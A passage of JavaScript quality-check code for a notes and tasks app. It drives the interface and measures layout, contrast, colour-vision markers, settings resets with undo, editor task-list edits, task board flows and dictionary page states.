        const dia = dot && getComputedStyle(dot).transform !== 'none', mark = al && getComputedStyle(al, '::before').content !== 'none', svgOff = al && getComputedStyle(al.querySelector(':scope > svg')).display === 'none';
        const barOk = bar && getComputedStyle(bar).backgroundColor === colorOf(`--time-${band}`);
        got.push(`${cv}: save dot ${dot ? (dia ? 'diamond' : 'round') : 'none'} · alert ${al ? (mark ? 'cross' : 'icon') : 'none'} · time-left bar ${band} ${bar ? getComputedStyle(bar).backgroundColor : 'none'}`);
        const on = cv !== 'off';
        if (!dot || dia !== on || !al || mark !== on || svgOff !== on || !barOk) iss('Build G colour vision in the app', got[got.length - 1]);
      }
      G.flows.surfaces = got.join(' · '); set({ state: 'ready', widgets: 'none' }); acReset(); }

    // Reset: one change on each card shows the 5 card Resets (the heads don't move); a card's Reset changes only that card, with Undo;
    // the page's Reset asks first (Cancel focused and keeps everything), then puts all of it back, accent and colour vision too
    { acReset(); feDemo('none'); Object.assign(S.a11y, A11Y_DEF); FE.custom = new Set(); set({ screen: '1366x768', theme: 'obsidian', font: 'opendyslexic', textsize: 'm', view: 'notes' }); open();
      const resets = () => [...pane().querySelectorAll('.cf-card-reset')].map(b => b.dataset.v).join(','), heads = () => [...pane().querySelectorAll('.cf-card-head')].map(hOf).join('/');
      const none = resets(), h0 = heads(), click = sel => pane().querySelector(sel).click();
      click('[data-act="acc-pick"][data-v="teal"]'); click('[data-act="set-cvd"][data-v="rg"]'); click('[data-act="set-reader"][data-k="textsize"][data-v="l"]');
      click('[data-act="cf-preset"][data-k="letter"][data-v="0.05"]'); click('[data-act="a11y-toggle"][data-v="bionic"]'); click('[data-act="a11y-toggle"][data-v="still"]');
      const all = resets(), h1 = heads(), rh = [...new Set([...pane().querySelectorAll('.cf-card-reset')].map(hOf))].join('/');
      const sig = () => JSON.stringify([READER.theme, accPick('obsidian'), AC.cvd, READER.textsize, S.a11y.letter, S.a11y.bionic, S.a11y.still]), changed = sig();
      click('.cf-card-reset[data-v="spacing"]'); const card1 = sig(), focus1 = document.activeElement?.id, undo = app.querySelector('.toast [data-act="cf-undo"]');
      undo?.click(); const undone = sig();
      click('.cf-card-reset[data-v="theme"]'); const card2 = sig();
      click('.cf-card-reset[data-v="aids"]'); clearTimeout(cfReset.t); FE.undo = null; S.toast = null; renderAll();
      click('[data-act="acc-pick"][data-v="amber"]'); AC.custom = '#0e7490'; AC.customTheme = 'paper'; renderAll(); const mid = sig();
      click('.cf-reset'); const ask = pane().querySelector('.cf-confirm'), askTxt = ask?.querySelector('.set-desc')?.textContent || '', askFocus = document.activeElement?.dataset.act;
      click('[data-act="cf-ask-no"]'); const kept = sig() === mid && !pane().querySelector('.cf-confirm') && document.activeElement?.classList.contains('cf-reset');
      click('.cf-reset'); click('[data-act="cf-reset-yes"]'); renderAll(); const ffocus = document.activeElement?.id; const fin = sig(), clean = !AC.custom && !Object.keys(AC.picks).length && AC.cvd === 'off', left = resets(), grey = pane().querySelector('.cf-reset').disabled;
      G.flows.reset = `card Resets with nothing changed "${none}" · after one change on each "${all}" (${rh}px; heads ${h0} → ${h1}px) · Spacing's Reset → ${card1}, focus #${focus1}, Undo ${!!undo} → back ${undone === changed} · Theme's Reset → ${card2}`
        + ` · page Reset asks "${askTxt}", focus ${askFocus} · Cancel keeps it ${kept} · Reset to defaults → ${fin}, accent, your colour and colour vision cleared ${clean}, card Resets "${left}", greyed ${grey}, focus #${ffocus} (kept after a redraw)`;
      if (none || all !== 'theme,text,spacing,aids,motion' || h0 !== h1 || rh !== '28' || card1 !== JSON.stringify(['obsidian', 'teal', 'rg', 'l', 0, true, true]) || focus1 !== 'cfc-spacing' || !undo || undone !== changed
        || card2 !== JSON.stringify(['obsidian', 'violet', 'off', 'l', .05, true, true]) || !ask || !/differ now/.test(askTxt) || askFocus !== 'cf-ask-no' || !kept
        || fin !== JSON.stringify(['obsidian', 'violet', 'off', 'm', 0, false, false]) || !clean || left || !grey || ffocus !== 'cf-page-title') iss('Build G Reset', G.flows.reset);
      clearTimeout(cfReset.t); FE.undo = null; S.toast = null; }

    // clicks keep the scrolled page where it is (an accent, Custom…, colour vision)
    for (const sc of ['1920x1080', '1366x768']) { set({ screen: sc, theme: 'paper' }); acReset(); open(); const p = pane(); p.scrollTop = 160; const y0 = p.scrollTop;
      pane().querySelector('[data-act="acc-pick"][data-v="teal"]').click(); pane().querySelector('[data-act="set-cvd"][data-v="tri"]').click(); pane().querySelector('.acc-custom-pick').click(); pane().querySelector('.acc-custom-pick').click();
      const y1 = pane().scrollTop; G.flows['scroll/' + sc] = `${Math.round(y0)} → ${Math.round(y1)}px`; if (Math.abs(y1 - y0) > 1) iss('Build G a click moved the page', `${sc}: ${G.flows['scroll/' + sc]}`); }

    // the Theme card: 4 screens × 3 themes × picker shut / open with a failing colour × colour vision off / on, and a narrow window
    const scr = Object.keys(SCREENS).map(sc => [sc, null]).concat([['1366x768', 683]]);
    for (const [sc, w] of scr) for (const theme of ['obsidian', 'paper', 'contrast']) for (const picker of [false, true]) for (const cv of ['off', 'rg']) {
      set({ screen: sc, theme, font: 'opendyslexic', textsize: 'm' }); if (w) frame.style.width = w + 'px';
      acReset(); AC.cvd = cv; if (picker) { AC.open = true; AC.custom = darkTheme(theme) ? '#1e3a8a' : '#f5c518'; AC.customTheme = theme; Object.keys(THEME_COL).forEach(t => { AC.picks[t] = 'custom'; }); } applyAccent(); open();
      const k = `${w ? w + 'x768' : sc}/${theme}/${picker ? 'picker' : 'shut'}/${cv}`, p = pane(), card = p.querySelector('.cf-card--theme'), cr = px(card).r;
      if (!w) measure(`buildG/${k}`); inside('.modal--settings', k);   // a snapped window: the dialog and its page (the app behind it has its own minimum)
      if (p.scrollWidth > p.clientWidth + 1) iss('Build G page scrolls sideways', k);
      const past = [...card.querySelectorAll('button, input, .alert, .cv-sample, .cv-item, .seg')].filter(el => el.offsetWidth && px(el).r > cr + .5);
      if (past.length) iss('Build G past the card edge', `${k}: ${String(past[0].className).slice(0, 30)}`);
      const chips = [...card.querySelectorAll('.acc-pick')], ch = [...new Set(chips.map(hOf))];
      if (ch.join() !== '32') iss('Build G accent chip not 32px', `${k}: ${ch}`);
      chips.forEach(c => { const t = c.lastElementChild; if (t.scrollWidth > t.clientWidth + 1) iss('Build G accent name cut', `${k}: ${t.textContent}`); });
      card.querySelectorAll('.seg-opt').forEach(o => { if (hOf(o) > 28.5) iss('Build G segment option wraps', `${k}: ${o.textContent}`); });
      const fixB = card.querySelector('[data-act="acc-fix"]'); if (picker && (!fixB || hOf(fixB) !== 28)) iss('Build G the fix button', `${k}: ${fixB ? hOf(fixB) : 'none'}`);
      if (picker && [hx(), card.querySelector('.acc-color')].some(e => !e || hOf(e) !== 32)) iss('Build G picker not 32px', k);
      const rows = new Set(chips.map(c => Math.round(px(c).t))).size;
      if (!w && cv === 'off') G.page[`${sc}/${theme}/${picker ? 'picker' : 'shut'}`] = `Theme card ${hOf(card)}px · page ${p.scrollHeight}px · ${chips.length} chips in ${rows} rows`;
    }
    frame.style.width = '';
    Object.assign(AC, acWas); applyAccent(); window.saveSettings = saveWas; Object.assign(S.a11y, a11yWas); FE.custom = new Set(); feDemo(null); S.setSec = 'appearance'; S.modal = null; applyComfort(); }
  /* ---- Editor QC: the user's three editor bugs (the task button, the task button on a selection, Ctrl+A then Delete),
     with the front matter kept and Ctrl+Z bringing it back ---- */
  { set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null, zen: 'off' }); const n = note(), keepMd = n.md, E = out.numbers.editor = {};
    const doc = () => app.querySelector('.doc'), md = () => { syncDoc(n); n.docDirty = true; return n.md; };
    const load = text => { n.md = text; n.html = null; n.docDirty = false; EDH.delete(n.id); renderAll(); out.combos++; doc().focus(); };
    const put = (a, ao, b, bo) => { const r = document.createRange(); r.setStart(a, ao); r.setEnd(b ?? a, bo ?? ao); getSelection().removeAllRanges(); getSelection().addRange(r); };
    const typed = (type, data) => doc().dispatchEvent(new InputEvent('beforeinput', { inputType: type, data, bubbles: true, cancelable: true }));
    const all = () => { const r = document.createRange(); r.selectNodeContents(doc()); getSelection().removeAllRanges(); getSelection().addRange(r); };
    // E-1: an empty line → an empty task, the caret straight after its box
    load('First line.'); const p = edNewP(); doc().append(p); put(p, 0); doFormat('task');
    { const li = doc().querySelector('li.task-list-item'), r = getSelection().getRangeAt(0), box = li && edBox(li);
      E.e1 = `${li ? 'task' : 'no task'} · text "${li?.textContent.trim()}" · caret ${r.collapsed && li?.contains(r.startContainer) && !!box && box.compareDocumentPosition(r.startContainer) & Node.DOCUMENT_POSITION_FOLLOWING ? 'after the box' : 'elsewhere'} · .md ${JSON.stringify(md())}`;
      if (!li || li.textContent.trim() || !/after the box/.test(E.e1) || md() !== 'First line.\n\n- [ ]') iss('Editor E-1 task button', E.e1); }
    // E-2: lines selected → each one a task with its text; again → plain lines; Ctrl+Z → tasks again; part of one line → that line
    load('Alpha one.\n\nBeta two.\n\nGamma.'); { const ps = doc().querySelectorAll('p'); put(ps[0].firstChild, 2, ps[1].firstChild, 4); }
    doFormat('task'); const on = md(); doFormat('task'); const off = md(); edUndo(doc()); const undone = md();
    load('Alpha one.\n\nBeta two.'); { const t = doc().querySelectorAll('p')[1].firstChild; put(t, 1, t, 6); } doFormat('task'); const part = md();
    E.e2 = [on, off, undone, part].map(x => JSON.stringify(x)).join(' · ');
    if (on !== '- [ ] Alpha one.\n- [ ] Beta two.\n\nGamma.' || off !== 'Alpha one.\n\nBeta two.\n\nGamma.' || undone !== on || part !== 'Alpha one.\n\n- [ ] Beta two.') iss('Editor E-2 task on a selection', E.e2);
    // E-3: Ctrl+A then Delete, Backspace or typing → one plain paragraph, the front matter kept, the caret in the editor; Ctrl+Z → all back
    const E3 = '---\nstatus: draft\n---\n\n# Heading\n\nText.\n\n- [ ] Task\n\n{{tasks}}';
    for (const [type, data, want] of [['deleteContentForward', null, '---\nstatus: draft\n---\n'], ['deleteContentBackward', null, '---\nstatus: draft\n---\n'], ['insertText', 'X', '---\nstatus: draft\n---\n\nX']]) {
      load(E3); const before = md(); all(); typed(type, data);
      const kids = [...doc().children].filter(c => !c.matches('[data-md="frontmatter"]')), after = md(), focus = document.activeElement === doc();
      edUndo(doc()); const back = md();
      E['e3 ' + type] = `${kids.map(c => c.outerHTML).join('')} · focus ${focus} · .md ${JSON.stringify(after)} · undo ${back === before}`;
      if (kids.length !== 1 || kids[0].nodeName !== 'P' || after !== want || !focus || back !== before) iss('Editor E-3 select all', `${type}: ${E['e3 ' + type]}`); }
    n.md = keepMd; n.html = null; n.docDirty = false; n.dirty = false; EDH.delete(n.id); renderAll(); }
  /* ---- end Editor QC ---- */
  /* ---- Build I (R35 "Today, Upcoming and Done", locked 2026-10-16): the Tasks page at 4 screens × 2 fonts (one x per column,
     every part on the title's line, controls on the 24/28/32/36 scale, nothing cut, no button alone on a line); its ⋯ menu inside
     the window; muted text in all nine themes; one weight for a pressed segment app-wide (the CSS and every segment drawn on the
     views, Settings pages, the quick timer and the task menu); the flows: quick add with Tomorrow / a date, a tick that stays put,
     the energy cycle, Overdue above Today, the filters, the due menu, Delete and Undo (a board task, and a "- [ ]" line task with
     its line), + Step, the wand's spinner, scroll kept through clicks, and Ctrl+K finding a word inside a note ---- */
  { const BI = out.numbers.buildI = { layout: {}, menu: {}, themes: {}, weight: {}, flows: {} }, q = s => app.querySelector(s), qa = s => [...app.querySelectorAll(s)];
    const R = el => el.getBoundingClientRect(), hOf = el => +R(el).height.toFixed(1), SCALE = [24, 28, 32, 36];
    const seed = () => {   // the sample's tasks with real dates: overdue, today, tomorrow, in 4 days, none (Later)
      D.tasks.forEach((t, i) => { t.dueDate = [dayKeyFrom(-2), todayKey(), dayKeyFrom(1), dayKeyFrom(4), null][i % 5]; t.due = t.dueDate && t.dueDate <= todayKey() ? 'Today' : 'Upcoming'; });
      D.tasks[0].steps = [{ t: 'Reproduce it with an empty block', m: 5, done: true }, { t: 'Write the failing test', m: 10, done: false }, { t: 'No minutes on this one', m: null, done: false }];
      S.taskStay = new Map(); S.taskMenu = null; S.taskShowDone = true; S.taskFilter = 'All'; S.stepAdd = null; TASK_UNDO.cur = null;
      S.taskDraft = { title: '', note: null, priority: 'Medium', energy: 'medium', due: undefined }; renderAll(); };
    const oneWeight = key => { let n = 0; qa('.seg').forEach(g => { const w = [...g.querySelectorAll('.seg-opt')].filter(o => o.offsetWidth).map(o => getComputedStyle(o).fontWeight + (o.getAttribute('aria-pressed') === 'true' ? '*' : ''));
      if (!w.length) return; n++; if (new Set(w.map(x => x.replace('*', ''))).size > 1) iss('Build I: a pressed segment changes weight', `${key}: ${w.join(' ')}`); }); return n; };
    // Layout
    for (const sc of Object.keys(SCREENS)) for (const font of ['opendyslexic', 'system']) {
      set({ screen: sc, font, theme: 'obsidian', sample: 'typical', view: 'tasks', side: true, modal: null, widgets: 'none', zen: 'off', state: 'ready' }); seed(); measure(`Build I ${sc}/${font}`);
      const k = `${sc}/${font}`, rows = qa('.tp-row'), col = s => new Set(rows.map(r => r.querySelector(s)).filter(Boolean).map(e => half(R(e).left))).size;
      const cols = { tick: col('.tp-tick'), prio: col('.tp-cell .chip'), due: col('.tp-due'), wand: col('.tp-wand'), more: col('.tp-more > .icon-btn') };
      const off = Math.max(...rows.map(r => { const tc = R(r.querySelector('.tp-title')).top + 12; return ['.tp-tick', '.tp-cell .chip', '.tp-due', '.tp-wand', '.tp-more > .icon-btn'].map(s => Math.abs(R(r.querySelector(s)).top + hOf(r.querySelector(s)) / 2 - tc)); }).flat());
      const ctl = qa('.tp button, .tp .field, .tp .seg, .tp .tp-meta .chip').filter(e => e.offsetWidth && !e.closest('.tp-tick')), bad = ctl.filter(e => !SCALE.includes(Math.round(hOf(e)))).map(e => `${(e.className || e.tagName).toString().slice(0, 20)} ${hOf(e)}`);
      const wrapped = qa('.tp .seg-opt').filter(o => o.offsetWidth && (hOf(o) > 28.5 || o.getClientRects().length > 1)).map(o => o.textContent);
      const cut = qa('.tp-quick *, .tp-card-head *, .tp-cell *').filter(e => e.offsetWidth && e.scrollWidth > e.clientWidth + 1 && getComputedStyle(e).textOverflow !== 'ellipsis' && !['INPUT', 'SELECT'].includes(e.tagName)).map(e => e.className.toString().slice(0, 20));
      const top = qa('.tp-quick-top > *').map(e => half(R(e).top)), alone = top.length === 3 && top[2] !== top[1] && top.filter(t => t === top[2]).length === 1;
      const cards = qa('.tp-card').map(c => c.dataset.card).join(','), quickH = Math.round(hOf(q('.tp-quick')));
      BI.layout[k] = `cols ${Object.values(cols).join('/')} · off ${off.toFixed(2)}px · quick add ${quickH}px · ${ctl.length} controls · cards ${cards}`;
      if (Object.values(cols).some(n => n !== 1)) iss('Build I: a task column drifts', `${k}: ${JSON.stringify(cols)}`);
      if (off > 0.5) iss('Build I: a part is off the title line', `${k}: ${off.toFixed(2)}px`);
      if (bad.length) iss('Build I: control off the 24/28/32/36 scale', `${k}: ${bad.slice(0, 4).join(', ')}`);
      if (wrapped.length) iss('Build I: a choice wraps', `${k}: ${wrapped.join(', ')}`);
      if (cut.length) iss('Build I: cut off', `${k}: ${[...new Set(cut)].slice(0, 4).join(', ')}`);
      if (alone) iss('Build I: Add task alone on a line', k);
      if (cards !== 'overdue,today,upcoming,done') iss('Build I: cards', `${k}: ${cards}`);
      oneWeight('tasks ' + k);
      // the ⋯ menu on the last row (opens above when there's no room below) and on the first: inside the window, controls on scale
      for (const which of ['first', 'last']) { const rr = which === 'first' ? rows[0] : rows[rows.length - 1], id = rr.dataset.taskRow; q('.view').scrollTop = which === 'first' ? 0 : 99999;
        app.querySelector(`[data-act="task-menu"][data-v="${id}"]`).click(); out.combos++; const m = q('.tp-menu');
        if (!m) { iss('Build I: the ⋯ menu did not open', `${k} ${which}`); continue; }
        inside('.tp-menu', `Build I menu ${k} ${which}`); const mb = R(m), vb = R(q('.view'));
        if (mb.top < vb.top - 1 || mb.bottom > vb.bottom + 1) iss('Build I: the ⋯ menu is cut off', `${k} ${which}: ${Math.round(mb.top)}–${Math.round(mb.bottom)} in ${Math.round(vb.top)}–${Math.round(vb.bottom)}`);
        const mbad = [...m.querySelectorAll('.seg, .field, .menu-item')].filter(e => !SCALE.includes(Math.round(hOf(e))) && !e.matches('.menu-item')).map(e => e.className.slice(0, 16) + ' ' + hOf(e));
        if (mbad.length) iss('Build I: menu control off scale', `${k}: ${mbad.join(', ')}`);
        BI.menu[`${k} ${which}`] = `${m.classList.contains('is-up') ? 'above' : 'below'} ⋯ · ${Math.round(mb.width)}×${Math.round(mb.height)}`; oneWeight('menu ' + k);
        S.taskMenu = null; renderAll(); }
    }
    // Nine themes: the muted parts on the card stay AA
    for (const [th] of THEMES) { set({ screen: '1366x768', font: 'opendyslexic', theme: th, sample: 'typical', view: 'tasks' }); seed(); const card = colorOf('--card');
      const r = ['.tp-due:not(.is-now)', '.tp-card-val', '.tp-opt-label', '.tp-step-min'].map(s => { const e = q(s); return e ? ratio(getComputedStyle(e).color, card) : 99; });
      S.taskMenu = D.tasks[0].id; renderAll(); r.push(ratio(getComputedStyle(q('.tp-menu-sub') || q('.tp-menu .menu-item')).color, card)); S.taskMenu = null;
      BI.themes[th] = r.join(' / '); r.forEach(x => { if (x < 4.5) iss('Build I: muted text under AA', `${th}: ${r.join(' / ')}`); }); }
    set({ theme: 'obsidian' });
    // One weight app-wide: no CSS rule bolds a pressed segment, and every segment drawn keeps one weight
    { const rules = []; for (const sh of document.styleSheets) { let list; try { list = sh.cssRules; } catch (e) { continue; } const walk = rs => [...rs].forEach(r => { if (r.cssRules) walk(r.cssRules); if (r.selectorText && /seg-opt/.test(r.selectorText) && /pressed|selected|is-on/.test(r.selectorText) && r.style.fontWeight && !['inherit', 'unset'].includes(r.style.fontWeight)) rules.push(`${r.selectorText} { font-weight: ${r.style.fontWeight} }`); }); walk(list); }
      if (rules.length) iss('Build I: CSS bolds a pressed segment', rules.join(' | '));
      let segs = 0; for (const view of ['notes', 'tasks', 'timer', 'history']) { set({ screen: '1920x1080', sample: 'typical', view, modal: null, widgets: 'none' }); segs += oneWeight('view ' + view); }
      set({ widgets: 'timer' }); segs += oneWeight('quick timer'); set({ widgets: 'none' });
      for (const [sec] of SET_SECTIONS) { S.setSec = sec; set({ modal: 'settings' }); segs += oneWeight('settings ' + sec); }
      S.setSec = 'appearance'; set({ modal: null }); BI.weight = `${rules.length} CSS rules bold a pressed segment · ${segs} segments drawn, one weight each`; }
    // Flows on the sample vault at 1366, OpenDyslexic
    set({ screen: '1366x768', font: 'opendyslexic', sample: 'typical', view: 'tasks', modal: null }); seed(); const F = BI.flows, card = id => app.querySelector(`[data-task-row="${id}"]`)?.closest('.tp-card')?.dataset.card;
    const type = (sel, v) => { const e = q(sel); e.value = v; e.dispatchEvent(new Event('input', { bubbles: true })); };
    // quick add: Tomorrow, High, Low battery; what you typed survives the choices
    type('#new-task-title', 'Phone the plumber'); ['[data-k="due"][data-v="tomorrow"]', '[data-k="priority"][data-v="High"]', '[data-k="energy"][data-v="low"]'].forEach(s => q('[data-act="task-q"]' + s).click());
    const kept = q('#new-task-title').value; q('[data-act="add-task"]').click(); await wait(0); let t = D.tasks.find(x => x.title === 'Phone the plumber');
    F.add = `typed "${kept}" kept · ${t ? `${card(t.id)} · ${q(`[data-task-row="${t.id}"] .tp-due`)?.textContent} · ${t.priority} · ${t.energy}` : 'not added'} · "${S.status}"`;
    if (kept !== 'Phone the plumber' || !t || card(t.id) !== 'upcoming' || t.dueDate !== dayKeyFrom(1) || t.priority !== 'High' || t.energy !== 'low') iss('Build I: quick add', F.add);
    // the date picker: a date makes no quick pick pressed; yesterday's date lands in Overdue
    type('#new-task-title', 'Return the library books'); { const di = q('#new-task-due'); di.value = dayKeyFrom(-1); di.dispatchEvent(new Event('change', { bubbles: true })); }
    const pressed = qa('.tp-quick [data-k="due"][aria-pressed="true"]').length; q('[data-act="add-task"]').click(); await wait(0); t = D.tasks.find(x => x.title === 'Return the library books');
    F.date = `${pressed} quick picks pressed · ${t && card(t.id)} · ${t && q(`[data-task-row="${t.id}"] .tp-due`)?.textContent}`;
    if (pressed || !t || card(t.id) !== 'overdue' || t.dueDate !== dayKeyFrom(-1)) iss('Build I: the date picker', F.date);
    // a tick keeps the row where it was (struck through); unticking puts it back the same way
    { const row = q('.tp-card[data-card="today"] .tp-row'), id = row.dataset.taskRow, ix = qa('.tp-row').indexOf(row); row.querySelector('[data-act="task-done"]').click();
      const r1 = q(`[data-task-row="${id}"]`), ix1 = qa('.tp-row').indexOf(r1), struck = r1.classList.contains('is-done'); r1.querySelector('[data-act="task-done"]').click(); const ix2 = qa('.tp-row').indexOf(q(`[data-task-row="${id}"]`));
      F.tick = `row ${ix} → ${ix1} (struck ${struck}) → ${ix2}`; if (ix !== ix1 || ix !== ix2 || !struck) iss('Build I: a tick moved the row', F.tick); }
    // the energy cycle, and it looks like a button
    { const id = D.tasks[1].id, seq = []; D.tasks[1].energy = 'high'; renderAll(); for (let i = 0; i < 3; i++) { q(`[data-act="energy"][data-v="${id}"]`).click(); seq.push(D.tasks[1].energy); }
      const b = q(`[data-act="energy"][data-v="${id}"]`), cs = getComputedStyle(b); F.energy = `high → ${seq.join(' → ')} · ${cs.borderTopWidth} edge, ${cs.cursor}, ${b.querySelectorAll('svg').length} icons, ${hOf(b)}px`;
      if (seq.join() !== 'medium,low,high' || cs.borderTopWidth !== '1px' || cs.cursor !== 'pointer' || b.querySelectorAll('svg').length !== 2) iss('Build I: energy chip', F.energy); }
    // the filters pick the cards
    { const got = {}; for (const f of ['Today', 'Upcoming', 'Completed', 'energy:low', 'All']) { { const fb = q(`[data-act="task-filter"][data-v="${f}"]`); if (fb) fb.click(); else fire('task-filter', f); } got[f] = qa('.tp-card').map(c => c.dataset.card + ':' + c.querySelectorAll('.tp-row').length).join(','); }
      const lowOk = qa('.tp-row').length && D.tasks.filter(x => x.energy === 'low' && !x.done).length; F.filters = JSON.stringify(got);
      if (!/^overdue:\d+,today:\d+$/.test(got.Today) || !/^upcoming:\d+$/.test(got.Upcoming) || !/^done:\d+$/.test(got.Completed) || !lowOk) iss('Build I: filters', F.filters); }
    // the due menu: Tomorrow, then Later (no date)
    { const id = q('.tp-card[data-card="today"] .tp-row').dataset.taskRow, tk = taskById(id); q(`[data-act="task-menu"][data-v="${id}"]`).click(); q(`[data-act="task-due"][data-k="tomorrow"][data-v="${id}"]`).click(); const c1 = card(id);
      q(`[data-act="task-menu"][data-v="${id}"]`).click(); q(`[data-act="task-due"][data-k="later"][data-v="${id}"]`).click(); const c2 = card(id), lbl = q(`[data-task-row="${id}"] .tp-due`).textContent;
      F.due = `Tomorrow → ${c1} · Later → ${c2} "${lbl}" (${tk.dueDate}) · menu closed ${!q('.tp-menu')}`; if (c1 !== 'upcoming' || c2 !== 'upcoming' || lbl !== 'Later' || tk.dueDate !== null || q('.tp-menu')) iss('Build I: due menu', F.due); }
    // Delete and Undo: a board task, then a "- [ ]" line task with its line
    for (const line of [false, true]) {
      const n = D.notes[0], md0 = n.md; let tk = D.tasks[2];
      if (line) { n.md = n.md.replace(/\s*$/, '') + '\n\n- [ ] Call the printer people\n\nAfter the list.'; tk = { id: 't-line', noteId: n.id, title: 'Call the printer people', priority: 'Medium', due: 'Today', dueDate: todayKey(), done: false, energy: 'medium' }; D.tasks.push(tk); renderAll(); }
      const mdBefore = n.md, at = D.tasks.indexOf(tk); q(`[data-act="task-menu"][data-v="${tk.id}"]`).click(); const sub = q('.tp-menu-sub')?.textContent || '';
      q(`[data-act="task-delete"][data-v="${tk.id}"]`).click(); await wait(0); await wait(0);
      const gone = !D.tasks.includes(tk) && !q(`[data-task-row="${tk.id}"]`), lineGone = !n.md.includes('Call the printer people'), msg = q('#status-text')?.textContent || '', undo = q('.status-bar [data-act="task-undo"]');
      undo?.click(); await wait(0); await wait(0);
      const back = D.tasks.indexOf(taskById(tk.id)) === at && !!q(`[data-task-row="${tk.id}"]`), mdBack = n.md === mdBefore;
      F['delete ' + (line ? 'line task' : 'board task')] = `menu "${sub}" · gone ${gone}${line ? `, line gone ${lineGone}` : ''} · "${msg}" · Undo ${!!undo} → back in place ${back}${line ? `, note as before ${mdBack}` : ''}`;
      if (!gone || !undo || !back || (line && (!lineGone || !mdBack || !/line/.test(msg) || !sub)) || (!line && sub)) iss('Build I: Delete and Undo', F['delete ' + (line ? 'line task' : 'board task')]);
      if (line) { D.tasks = D.tasks.filter(x => x.id !== 't-line'); n.md = md0; n.html = null; } TASK_UNDO.cur = null; status.clear(); renderAll(); }
    // + Step adds a step and keeps the row open; the wand shows its spinner
    { const tk = D.tasks.find(x => !x.done && dueGroup(x) === 'today') || D.tasks.find(x => !x.done), n0 = (tk.steps || []).length; q(`[data-act="step-add"][data-v="${tk.id}"]`).click();
      const inp = q('#new-step-text'); inp.value = 'Open the parser file'; q('#new-step-min').value = '5'; inp.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true })); await wait(0); await wait(0);
      F.step = `${n0} → ${(tk.steps || []).length} steps · row open ${!!q('#new-step-text')} · minutes ${tk.steps?.[tk.steps.length - 1]?.m}`; if ((tk.steps || []).length !== n0 + 1 || tk.steps[n0].m !== 5) iss('Build I: + Step', F.step);
      S.stepAdd = null; S.splitting = tk.id; renderAll(); F.wand = q(`[data-task-row="${tk.id}"] .tp-split`)?.textContent.trim() || 'no spinner'; if (!/Breaking it down/.test(F.wand)) iss('Build I: wand spinner', F.wand); S.splitting = null; renderAll(); }
    // clicks keep a scrolled board where it was: a tick, the energy chip, ⋯ open and shut, Show / Hide on Done
    { S.taskShowDone = false; renderAll(); const v0 = q('.view'), mid = qa('.tp-row')[4]; v0.scrollTop = Math.max(0, R(mid).top - R(v0).top + v0.scrollTop - 200); const s0 = q('.view').scrollTop, got = [];
      const id = mid.dataset.taskRow; for (const act of [() => q(`[data-task-row="${id}"] [data-act="task-done"]`).click(), () => q(`[data-act="energy"][data-v="${id}"]`).click(), () => q(`[data-act="task-menu"][data-v="${id}"]`).click(), () => q('.view-title').click(), () => q('[data-act="task-done-fold"]').click()]) { act(); got.push(q('.view').scrollTop); }
      F.scroll = `${s0}px → ${got.join(', ')}`; if (!s0 || got.some(x => Math.abs(x - s0) > 1)) iss('Build I: a click moved the board', F.scroll); }
    // Ctrl+K finds a word inside a note: the matching line is the sub-text, Enter opens the note with the word selected
    { const n = D.notes[2], md0 = n.md; n.md = n.md.replace(/\s*$/, '') + '\n\nThe zebrafish protocol lives in the lab binder.'; n.html = null;
      openPalette(); type('#palette-input', 'zebrafish'); const items = S.pal.flat.filter(x => x.run[0] === 'note-at'), it = S.pal.flat.findIndex(x => x.run[0] === 'note-at'); runPalette(it);
      const sel = String(getSelection()), at = note()?.id; F.search = `${items.length} text match · "${items[0]?.label}" · sub "${items[0]?.sub}" · opened ${at === n.id} · selected "${sel}"`;
      if (items.length !== 1 || !/zebrafish protocol/.test(items[0].sub) || at !== n.id || sel.toLowerCase() !== 'zebrafish') iss('Build I: Ctrl+K in note text', F.search);
      getSelection().removeAllRanges(); n.md = md0; n.html = null; }
    oneWeight('flows'); S.taskStay = new Map(); S.taskMenu = null; S.taskShowDone = false; S.taskFilter = 'All'; S.stepAdd = null; TASK_UNDO.cur = null; status.clear(); set({ sample: 'typical', view: 'notes', font: 'opendyslexic' }); }
  /* ---- end Build I ---- */
  /* ---- Build J: the Dictionary page in every download state at every screen and theme; search with misspellings; your words
     (add, edit, delete); the word popover; Ctrl+K; the rail button and "Look up" on a note's right-click menu; Read aloud;
     the year on Timer → Insights at every width (fills and darkens, folds into two halves, tooltip, keys, History at a day) ---- */
  { const J = out.numbers.buildJ = { page: {}, flows: {}, pop: {}, year: {}, keep: {} }, tick = () => new Promise(r => setTimeout(r, 0));
    const hOf = el => Math.round(el.getBoundingClientRect().height);
    const offScale = root => [...root.querySelectorAll('button:not(.dict-row):not(.yh-cell):not(.chip):not(.list-item):not(.link-btn), input:not([type="checkbox"]):not([type="range"]), select')]
      .filter(el => el.offsetWidth && ![24, 28, 32, 36].includes(hOf(el))).map(el => `${hOf(el)}px ${String(el.className).split(' ')[0] || el.tagName}`);
    const cut = root => [...root.querySelectorAll('.btn, .seg-opt, .chip, .eyebrow, .dict-word, .set-label')].filter(el => el.offsetWidth && el.scrollWidth > el.clientWidth + 1 && getComputedStyle(el).textOverflow !== 'ellipsis').map(el => el.textContent.trim().slice(0, 24));
    const type = async q => { const i = app.querySelector('#dict-q'); i.value = q; i.dispatchEvent(new Event('input', { bubbles: true })); await djType(q); await tick(); renderAll(); return [app.querySelector('.dict-word')?.textContent || null, !!app.querySelector('.dict-guess'), [...app.querySelectorAll('.dict-group')].map(g => g.textContent.trim()).join(' / ')]; };
    const openAt = async (o, st, q) => { djDemo(st, o); DJ.q = q || ''; set({ ...o, view: 'dict', modal: null }); if (DJ.q) { await djSearchNow(); renderAll(); } return app.querySelector('#main-view-dict'); };
    const STATES = { none: '.dict-get [data-act="dict-download"]', downloading: '.dict-get .progress', building: '.dict-get .progress', failed: '.dict-get--failed', ready: '.dict-entry', typo: '.dict-guess', noresults: '.dict-none', mywords: '.dict-mine', add: '.dict-form' };
    for (const sc of Object.keys(SCREENS)) for (const th of ['obsidian', 'paper', 'contrast']) for (const [k, sel] of Object.entries(STATES)) {
      const st = ['none', 'downloading', 'building', 'failed'].includes(k) ? k : 'ready', key = `${sc}/${th}/${k}`;
      const v = await openAt({ screen: sc, theme: th, sample: 'typical' }, st, { ready: 'consolidate', typo: 'consolodate', noresults: 'xqzt', none: 'crdt' }[k]);
      if (k === 'mywords') { fire('dict-scope', 'mine'); await tick(); await tick(); renderAll(); }
      if (k === 'add') { djAdd('DAG'); renderAll(); }
